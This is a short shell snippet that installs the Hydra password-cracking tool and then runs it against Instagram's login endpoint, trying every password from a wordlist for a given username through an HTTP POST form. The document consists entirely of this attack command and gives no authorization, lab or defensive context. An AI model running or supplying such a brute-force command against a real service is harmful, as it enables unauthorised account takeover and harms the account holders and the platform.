# Install Hydra
sudo apt-get install hydra

# Perform a brute force attack
hydra -l username -P /path/to/password/list.txt instagram.com http-post-form "/accounts/login/ajax/:username=^USER^&password=^PASS^&queryParams=null:F=json" -vV
